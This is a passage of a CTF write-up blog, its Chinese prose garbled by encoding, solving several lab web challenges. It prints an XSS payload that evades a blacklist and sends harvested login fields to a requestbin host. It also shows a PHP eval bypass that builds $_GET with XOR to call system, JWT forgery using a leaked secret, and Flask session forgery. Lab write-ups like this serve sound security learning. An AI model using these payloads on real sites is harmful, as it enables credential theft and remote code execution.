<p>çœ‹äº†æºç ä¹‹åå¯ä»¥å‘ç°ä»£ç å—ï¼Œè¿™é‡Œçš„é»‘åå•æ˜¯è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢çš„ï¼Œé‚£æˆ‘ä»¬åœ¨è¢«è¿‡æ»¤çš„å­—ç¬¦ä¸²ä¸­é—´åŠ ä¸Šcookieå°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$feedback</span>))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;åé¦ˆä¸åˆæ³•&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$blacklist</span> = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">		        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		            <span class="keyword">if</span>(stripos(<span class="variable">$feedback</span>,<span class="variable">$val</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		                <span class="variable">$feedback</span> = str_ireplace(<span class="variable">$val</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$feedback</span>);</span><br><span class="line">		            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		                <span class="keyword">break</span>;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å°è¯•å†™å…¥<code>&lt;scricookiept&gt;alert(1)&lt;/scrcookieipt&gt;</code>ï¼Œä¹‹åå†è¿›è¡Œè®¿é—®ï¼Œå¯ä»¥å‘ç°å¯èƒ½å­˜åœ¨xssæ”»å‡»ï¼Œä½†æ˜¯ä¹‹åä¸çŸ¥é“è¯¥æ€ä¹ˆåˆ©ç”¨åå°„æ€§xssæ”»å‡»å»è¯»å–flag</p>
<p><img src="https://img-blog.csdnimg.cn/1966826b62964206acb541412d11e7c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä¹‹åçœ‹ç™»é™†ç•Œé¢çš„jsæºç ï¼Œè´¦æˆ·å’Œå¯†ç éƒ½è¢«å¡«å…¥äº†è¡¨å•ï¼Œé‚£ä¹ˆçŒœæµ‹flagæˆ–è®¸å¯èƒ½æ˜¯è´¦æˆ·æˆ–è€…å¯†ç ï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ pocè·å–å¯†ç å’Œè´¦æˆ·ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">&#x27;; &#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">&#x27;user&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">&#x27;psw&#x27;</span>]) != <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;username&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;password&quot;</span>)[<span class="number">0</span>].value = cookie[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pocï¼ˆè¿™é‡Œå¯ä»¥åˆ©ç”¨requestbinï¼‰ï¼Œä¹‹åå°±å¯ä»¥åœ¨requestbiné‚£é‡Œè·å–åˆ°ä»£ç æ‰§è¡Œçš„ä¿¡æ¯ï¼Œå¾—åˆ°flagï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;inpcookieut type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;/inpcookieut&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">inpcookieut</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">inpcookieut</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span> <span class="attr">scookierc</span>=<span class="string">&quot;./js/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scricookiept</span>&gt;</span></span></span><br><span class="line"><span class="xml">	var uname = documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var passwd = documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span></span><br><span class="line"><span class="xml">	var res = uname + &quot; &quot; + passwd;</span></span><br><span class="line"><span class="xml">	documcookieent.locacookietion=&quot;http://http.requestbin.buuoj.cn/*/?a=&quot;+res;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h4><p>ä¹‹å‰åšè¿‡ç±»ä¼¼çš„é¢˜ç›®</p>
<p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>å®¡è®¡ä»£ç +å®¡é¢˜</strong></p>
<p>è§„å®šgetä¼ å…¥çš„å€¼é•¿åº¦è¦å°äº60ï¼Œä¸”ä¸èƒ½æœ‰ç©ºæ ¼ç­‰ç‰¹æ®Šç¬¦å·ï¼Œé™¤æ­¤ä¹‹å¤–å¯¹äºä½¿ç”¨çš„æ•°å­¦å‡½æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯çœ‹è¿‡ä¹‹åæ²¡æœ‰å¯ä»¥åœ¨å­—ç¬¦å’Œæ•°å€¼ä¹‹é—´è½¬æ¢çš„å‡½æ•°ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯ä¸èƒ½ç›´æ¥åˆ©ç”¨çš„</p>
<p>é‚£æˆ–è®¸æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å–åæˆ–è€…å¼‚æˆ–è¿ç®—æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°</p>
<p>æ¯”å¦‚æˆ‘ä»¬åƒæ‰§è¡Œçš„ä»£ç ä¸ºï¼š<code>system(&#39;cat /flag&#39;);</code>ä¹Ÿå¯ä»¥æ„é€ <code>$_GET[1]($_GET[2]);</code></p>
<p>å¯ä»¥è¯•ç€å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;1234567890!@#$%^&amp;*()_+=-&#x27;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment"># code...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span> = <span class="number">0</span>;<span class="variable">$k</span> &lt; <span class="number">9</span>;<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="comment">// echo $value.&quot;\n&quot;;</span></span><br><span class="line">                <span class="comment">// echo ($j.$k).&quot;\n&quot;;</span></span><br><span class="line">                <span class="variable">$a</span> = (<span class="variable">$value</span> ^ <span class="variable">$j</span>.<span class="variable">$k</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="string">&#x27;_G&#x27;</span> || <span class="variable">$a</span> == <span class="string">&#x27;ET&#x27;</span>)</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>).<span class="string">&quot; = <span class="subst">$a</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$b</span> = <span class="variable">$value</span> ^ (<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$b</span> == <span class="string">&#x27;SYS&#x27;</span> || <span class="variable">$b</span> == <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>).<span class="string">&quot; = <span class="subst">$b</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// echo &quot;\n&quot;;</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># is_finite^64 = _G</span></span><br><span class="line"><span class="comment"># is_infinite^64 = _G</span></span><br><span class="line"><span class="comment"># is_nan^64 = _G</span></span><br><span class="line"><span class="comment"># mt_getrandmax^23 = _G</span></span><br><span class="line"><span class="comment"># mt_rand^23 = _G</span></span><br><span class="line"><span class="comment"># mt_srand^23 = _G</span></span><br><span class="line"><span class="comment"># rad2deg^75 = ET</span></span><br><span class="line"><span class="comment"># rand^75 = ET</span></span><br><span class="line"><span class="comment"># srand^475 = GET</span></span><br><span class="line"><span class="comment"># tan^15 = ET</span></span><br><span class="line"><span class="comment"># tanh^15 = ET</span></span><br></pre></td></tr></table></figure>

<p>æœ€åé€‰æœ€çŸ­çš„å‡ ä¸ªæ¥ç»„æˆpayloadå§ï¼šï¼ˆæ³¨æ„è¿™é‡Œçš„64çš„ç±»å‹è¦æ˜¯å­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls%20/</span><br></pre></td></tr></table></figure>

<p>ä¹‹åcatä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<h4 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h4><p>æ‰“å¼€é¶æœºï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç‚¹å‡»æ²¡ååº”ï¼ŒF12ä¹‹åå‘ç°cookieé‡Œé¢æœ‰sessionï¼Œä½†æ˜¯base64è§£ç ä¹‹ååªçœ‹å‡ºæ¥äº†åˆsessionidï¼Œä¹‹åæŸ¥çœ‹äº†ä¸€ä¸‹æºç ï¼Œå‘ç°åŸæ¥æ¯ä¸ªæ ¼å­éƒ½å¯¹åº”ç€ä¸€ä¸ªid</p>
<p><img src="https://img-blog.csdnimg.cn/67f21a816e3346db8c865c1dfeb09261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¹¶ä¸”æœ‰<code>action=/move</code>è€Œinputæ ‡ç­¾å¯ä»¥åˆ©ç”¨moveè¾“å…¥å¯¹åº”çš„å€¼ï¼Œé‚£ä¹ˆéšä¾¿è¯•ä¸€ä¸‹ï¼Œå¥½å˜›ï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬ç»å¸¸ç©çš„äº•å­—æ£‹å˜›<img src="https://img-blog.csdnimg.cn/ba82e29e7954461e9be303f5d075062d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£å°±ç›´æ¥é€‰ä¸‰ä¸ªå¯ä»¥è¿èµ·æ¥çš„è¿›è¡Œpostä¼ å€¼å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>payloadï¼šï¼ˆç›´æ¥å¼ºåˆ¶æ€§ä¼ å°±å¥½å•¦ å³ä½¿brå¤„å‡ºç°äº†åœ†åœˆä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆå½±å“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move=c</span><br><span class="line">move=ul</span><br><span class="line">move=br</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h4><ul>
<li>jwt</li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œå¼€å§‹æ˜¯ç™»é™†æ³¨å†Œï¼Œå…ˆè¯•ä¸€ä¸‹adminä¸‡èƒ½å¯†ç ç™»å½•ï¼Œæ²¡æœ‰æˆåŠŸï¼Œæ³¨å†Œadminå‘ç°adminç”¨æˆ·å·²å­˜åœ¨ï¼Œé‚£å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·è¿›å»å§</p>
<p>ç„¶åå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œéƒ½è¯•äº†ä¸€éä¹‹åå¯ä»¥ç¡®å®šä¸æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´äº†</p>
<p><img src="https://img-blog.csdnimg.cn/9116b9c5c52447c3a8fe11ef3dfcd4bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>æŠ“åŒ…ä¹‹åå‘ç°cookieé‡Œé¢æœ‰sessionidï¼Œæ ¼å¼æ˜æ˜¾å°±æ˜¯jwtï¼Œç›´æ¥è§£ç çœ‹çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/b9621411185b4f03a5346cc3756b175b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>è¯´æ˜æˆ‘ä»¬å¯ä»¥ä¼ªé€ æˆ‘ä»¬çš„èº«ä»½ä¸ºadminï¼Œç„¶åè¿›å»çœ‹çœ‹ï¼Œä½†æ˜¯ç°åœ¨é‡ç‚¹æ˜¯æ€ä¹ˆè·å¾—å¯†é’¥</p>
<p>é‡äº‹ä¸å†³ï¼Œæ‰«ä¸€ä¸‹åå°æŠŠï¼Œå‘ç°æœ‰robots.txtï¼ˆå¤ªä¹…æ²¡åšé¢˜ï¼Œå¯¼è‡´æœ‰æ—¶å€™åº”è¯¥èƒ½ç›´æ¥è‡ªå·±è¯•å‡ºæ¥çš„ä¸œè¥¿è¦ä»å¤´å¼€å§‹è¿‡äº†å®³</p>
<p><img src="https://img-blog.csdnimg.cn/1a490bf975cc483085c6479fbbf1163f.png" alt="img"></p>
<p>æŸ¥çœ‹robots.txtä¹‹åå¯ä»¥å¾—åˆ°å¯†é’¥å•¦ï¼š<code>you-will-never-guess</code></p>
<p>ç›´æ¥è§£å¯†ä¹‹ååŠ å¯†ï¼ŒæŠ“åŒ…æ”¾åŒ…ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/af8428d257eb4a7ab2255990f6d7bada.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å‘ç°æœ‰flag.pngï¼Œä½†æ˜¯å‘ç°ä¸ªé—®é¢˜ï¼Œç›´æ¥è®¿é—®æ˜¯å¾—ä¸åˆ°flagçš„ï¼Œæƒ³åˆ°ä¹‹å‰å¯ä»¥åˆ©ç”¨curlä¸‹è½½æ–‡ä»¶</p>
<p><img src="https://img-blog.csdnimg.cn/3d8a1e915f6f4a478d35f353cec9e4f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç”¨curlè¯•äº†å¥½å¤šå‘½ä»¤ä¹‹åï¼Œæ²¡æƒ³åˆ°ç›´æ¥curl urlå°±å¯ä»¥å¾—åˆ°flagäº†ï¼Œè¿˜å¾—ç»§ç»­å­¦ä¹ curlçš„ç”¨é€”å‘¢</p>
<p><img src="https://img-blog.csdnimg.cn/ec5ef169a68a42e5b67949a925b50a01.png" alt="img"></p>
<h4 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h4><ul>
<li>flask sessionä¼ªé€ </li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œç™»å½•é¡µé¢æ²¡æœ‰é™åˆ¶ï¼Œç™»å½•è¿›å»ä¹‹åæœ‰uploadç•Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ï¼Œå¹¶ä¸”3ç§’ä¹‹åè‡ªåŠ¨è¿”å›é¦–é¡µï¼ŒF12æŸ¥çœ‹cookieä¹‹åå‘ç°æœ‰sessionå€¼ï¼Œæ ¼å¼å¾ˆåƒjwtï¼Œä½†æ˜¯jwtè§£ç ä¹‹åå‡ºç°ä¹±ç ï¼Œé‚£ä¹Ÿå¯èƒ½æ˜¯flask sessionï¼Œç”¨è„šæœ¬å¼ºåˆ¶è§£ç ä¹‹åå¯ä»¥å¾—åˆ°ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/98135d0238f04408884d2484d82f84a6.png" alt="img"></p>
<p>å…¶ä¸­ï¼Œåé¢çš„usernameå’Œpasswordè§£ç ä¹‹åéƒ½æ˜¯defaultï¼Œé‚£ä¹ˆçŒœæµ‹å¦‚æœæŠŠusernameæ”¹æˆadminä¼šæ€ä¹ˆæ ·ï¼Œä½†æ˜¯æ²¡æœ‰å¯†é’¥ï¼Œé‚£ä¹ˆè¯•ç€çœ‹çœ‹robots.txtæœ‰æ²¡æœ‰æç¤ºï¼Œå‘ç°æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œè™½ç„¶è¿”å›äº†<code>404 not found</code>ä½†æ˜¯é¡µé¢åŠ è½½æ˜¯200ï¼Œè¯´æ˜æ˜¯å­˜åœ¨è¿™ä¸ªæ–‡ä»¶çš„ï¼Œå¯ä»¥åœ¨F12ä¹‹åå‘ç°æŸä¸ªç‰¹åˆ«çš„å†…å®¹ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/2c3d0aa3044046fa8dafb9a84943a1cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>base64è§£ç ä¹‹åå¾—åˆ°å¯†é’¥ï¼šï¼ˆè™½ç„¶ä¸ç¡®å®šåé¢çš„é‚£äº›ç¬¦å·æ˜¯ä¸æ˜¯ï¼Œå…ˆæµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3aaeade9571a40fb9b2ce41770ed1dbc.png" alt="img"></p>
